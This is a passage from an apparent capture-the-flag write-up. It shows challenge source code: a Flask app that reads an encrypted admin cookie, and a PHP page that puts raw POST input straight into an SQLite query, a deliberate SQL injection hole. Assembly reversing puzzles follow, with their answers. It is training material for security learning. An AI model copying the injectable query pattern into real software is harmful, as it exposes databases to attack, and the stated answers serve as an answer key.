</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;main&#39;</span>))
</span></span><span style=display:flex><span>  data <span style=color:#f92672>=</span> AESCipher(app<span style=color:#f92672>.</span>secret_key)<span style=color:#f92672>.</span>decrypt(encrypted)
</span></span><span style=display:flex><span>  data <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>     check <span style=color:#f92672>=</span> data[<span style=color:#e6db74>&#39;admin&#39;</span>]
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyError</span>:
</span></span><span style=display:flex><span>     check <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> check <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;flag.html&#39;</span>, value<span style=color:#f92672>=</span>flag_value)
</span></span><span style=display:flex><span>  flash(<span style=color:#e6db74>&#34;Success: You logged in! Not sure you&#39;ll be able to see the flag though.&#34;</span>, <span style=color:#e6db74>&#34;success&#34;</span>)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;not-flag.html&#39;</span>, cookie<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AESCipher</span>:
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Usage:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        c = AESCipher(&#39;password&#39;).encrypt(&#39;message&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        m = AESCipher(&#39;password&#39;).decrypt(c)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Tested under Python 3 and PyCrypto 2.6.1.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, key):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>key <span style=color:#f92672>=</span> md5(key<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf8&#39;</span>))<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(self, raw):
</span></span><span style=display:flex><span>        raw <span style=color:#f92672>=</span> pad(raw)
</span></span><span style=display:flex><span>        iv <span style=color:#f92672>=</span> Random<span style=color:#f92672>.</span>new()<span style=color:#f92672>.</span>read(AES<span style=color:#f92672>.</span>block_size)
</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(self<span style=color:#f92672>.</span>key, AES<span style=color:#f92672>.</span>MODE_CBC, iv)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> b64encode(iv <span style=color:#f92672>+</span> cipher<span style=color:#f92672>.</span>encrypt(raw))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(self, enc):
</span></span><span style=display:flex><span>        enc <span style=color:#f92672>=</span> b64decode(enc)
</span></span><span style=display:flex><span>        iv <span style=color:#f92672>=</span> enc[:<span style=color:#ae81ff>16</span>]
</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(self<span style=color:#f92672>.</span>key, AES<span style=color:#f92672>.</span>MODE_CBC, iv)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> unpad(cipher<span style=color:#f92672>.</span>decrypt(enc[<span style=color:#ae81ff>16</span>:]))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf8&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run()
</span></span></code></pre></td></tr></table></div></div><h2 id=xa-simple-question>【X】A Simple Question<a hidden class=anchor aria-hidden=true href=#xa-simple-question>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-27>27</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>  include &#34;config.php&#34;;
</span></span><span style=display:flex><span>  ini_set(&#39;error_reporting&#39;, E_ALL);
</span></span><span style=display:flex><span>  ini_set(&#39;display_errors&#39;, &#39;On&#39;);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  $answer = $_POST[&#34;answer&#34;];
</span></span><span style=display:flex><span>  $debug = $_POST[&#34;debug&#34;];
</span></span><span style=display:flex><span>  $query = &#34;SELECT * FROM answers WHERE answer=&#39;$answer&#39;&#34;;
</span></span><span style=display:flex><span>  echo &#34;&lt;pre&gt;&#34;;
</span></span><span style=display:flex><span>  echo &#34;SQL query: &#34;, htmlspecialchars($query), &#34;\n&#34;;
</span></span><span style=display:flex><span>  echo &#34;&lt;/pre&gt;&#34;;
</span></span><span style=display:flex><span>?&gt;
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>  $con = new SQLite3($database_file);
</span></span><span style=display:flex><span>  $result = $con-&gt;query($query);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  $row = $result-&gt;fetchArray();
</span></span><span style=display:flex><span>  if($answer == $CANARY)  {
</span></span><span style=display:flex><span>    echo &#34;&lt;h1&gt;Perfect!&lt;/h1&gt;&#34;;
</span></span><span style=display:flex><span>    echo &#34;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&#34;;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  elseif ($row) {
</span></span><span style=display:flex><span>    echo &#34;&lt;h1&gt;You are so close.&lt;/h1&gt;&#34;;
</span></span><span style=display:flex><span>  } else {
</span></span><span style=display:flex><span>    echo &#34;&lt;h1&gt;Wrong.&lt;/h1&gt;&#34;;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>?&gt;
</span></span></code></pre></td></tr></table></div></div><h1 id=reversing>reversing<a hidden class=anchor aria-hidden=true href=#reversing>#</a></h1><h2 id=assembly-0>assembly-0<a hidden class=anchor aria-hidden=true href=#assembly-0>#</a></h2><p>What does asm0(0xd8,0x7a) return? 0x7a。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-14>14</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>.intel_syntax noprefix
</span></span><span style=display:flex><span>.bits 32
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>.global asm0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>asm0:
</span></span><span style=display:flex><span>	push	ebp
</span></span><span style=display:flex><span>	mov	ebp,esp
</span></span><span style=display:flex><span>	mov	eax,DWORD PTR [ebp+0x8]
</span></span><span style=display:flex><span>	mov	ebx,DWORD PTR [ebp+0xc]
</span></span><span style=display:flex><span>	mov	eax,ebx
</span></span><span style=display:flex><span>	mov	esp,ebp
</span></span><span style=display:flex><span>	pop	ebp	
</span></span><span style=display:flex><span>	ret
</span></span></code></pre></td></tr></table></div></div><h2 id=assembly-1>assembly-1<a hidden class=anchor aria-hidden=true href=#assembly-1>#</a></h2><p>What does asm1(0xcd) return? 0xca。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-36>36</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>.intel_syntax noprefix
</span></span><span style=display:flex><span>.bits 32
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>.global asm1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>asm1:
</span></span><span style=display:flex><span>	push	ebp
</span></span><span style=display:flex><span>	mov	ebp,esp
</span></span><span style=display:flex><span>	cmp	DWORD PTR [ebp+0x8],0xde
</span></span><span style=display:flex><span>	jg 	part_a	
</span></span><span style=display:flex><span>	cmp	DWORD PTR [ebp+0x8],0x8
</span></span><span style=display:flex><span>	jne	part_b
</span></span><span style=display:flex><span>	mov	eax,DWORD PTR [ebp+0x8]
</span></span><span style=display:flex><span>	add	eax,0x3
</span></span><span style=display:flex><span>	jmp	part_d
</span></span><span style=display:flex><span>part_a:
</span></span><span style=display:flex><span>	cmp	DWORD PTR [ebp+0x8],0x4e
</span></span><span style=display:flex><span>	jne	part_c
</span></span><span style=display:flex><span>	mov	eax,DWORD PTR [ebp+0x8]
</span></span><span style=display:flex><span>	sub	eax,0x3
</span></span><span style=display:flex><span>	jmp	part_d
</span></span><span style=display:flex><span>part_b:
</span></span><span style=display:flex><span>	mov	eax,DWORD PTR [ebp+0x8]
</span></span><span style=display:flex><span>	sub	eax,0x3
</span></span><span style=display:flex><span>	jmp	part_d
</span></span><span style=display:flex><span>	cmp	DWORD PTR [ebp+0x8],0xee
</span></span><span style=display:flex><span>	jne	part_c
</span></span><span style=display:flex><span>	mov	eax,DWORD PTR [ebp+0x8]
</span></span><span style=display:flex><span>	sub	eax,0x3
</span></span><span style=display:flex><span>	jmp	part_d
</span></span><span style=display:flex><span>part_c:
</span></span><span style=display:flex><span>	mov	eax,DWORD PTR [ebp+0x8]
</span></span><span style=display:flex><span>	add	eax,0x3
</span></span><span style=display:flex><span>part_d:
</span></span><span style=display:flex><span>	pop	ebp
</span></span><span style=display:flex><span>	ret
</span></span></code></pre></td></tr></table></div></div><h2 id=assembly-2>assembly-2<a hidden class=anchor aria-hidden=true href=#assembly-2>#</a></h2><p>What does asm2(0x7,0x28) return? <code>hex(int((0xa1df-0x7)/float(0x76))+1+0x28)</code> => 0x188</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-11>11</a>
